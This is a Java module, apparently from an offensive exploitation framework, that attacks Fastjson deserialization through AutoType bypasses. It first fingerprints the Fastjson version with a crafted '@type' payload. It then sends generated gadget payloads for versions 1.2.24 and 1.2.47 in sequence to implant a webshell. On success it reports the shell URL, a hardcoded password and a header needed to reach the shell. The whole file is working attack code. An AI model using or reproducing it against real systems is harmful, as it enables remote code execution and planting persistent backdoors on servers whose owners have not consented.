package exp.fastjson;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import utils.Util;
import utils.okhttplib.OkHttp;

import java.io.IOException;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Fastjson_AutoType_ByPass extends BaseExp implements AttackBase {

    public void detectVersion(String target){
        String version = "UnKnow";
        String payload = "{\"@type\":\"java.lang.AutoCloseable\"";
        HashMap<String, String> header = new HashMap<String, String>();
        header.put("Cache-Control", "max-age=0");
        header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
        header.put("Accept-Encoding", "gzip, deflate");
        header.put("Accept-Language", "zh-CN,zh;q=0.9");

        String mime = "application/json; charset=utf-8";
        // sendRequest
        Response response = null;
        try {
            response = this.launch(target, payload.toString(), mime, header);
            String bodyResult = response.body().string();
            String pattern = "version ([\\d.]+)";
            Pattern r = Pattern.compile(pattern);
            Matcher matcher = r.matcher(bodyResult);
            if(matcher.find()){
                version = matcher.group().split(" ")[1];
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            Util.messageQueue.add(String.format("FastJson Version is： %s \n", version));
        }
        response.close();
    }

    public boolean attack(String target, String gadgetType, String payloadType, String trojanType)  {
        boolean success = false;
        Object payload = null;
        try {
            payload = GeneratePayload.generatePayload(gadgetType, payloadType, trojanType);
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
            String mime = "application/json; charset=utf-8";
            this.launch(target ,payload.toString(), mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(target, header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                success = true;
                Util.messageQueue.add(String.format("Shell_Url： %s\n", target));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
        return success;
    }

    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");
        String [] trojanTypes = new String[]{
                "FastJson_1224",
                "FastJson_1224_2",
                "FastJson_1224_3",
                "FastJson_1224_4",
                "FastJson_1247",
                "FastJson_1247_2",
                "FastJson_1247_3",
                "FastJson_1247_4"
        };
        String gadgetType = params.get("gadgetType");
        String payloadType = params.get("payloadType");
        this.detectVersion(target);
        for (String trojanType: trojanTypes){
            if (this.attack(target, gadgetType,payloadType, trojanType)) break;
        }
    }
}
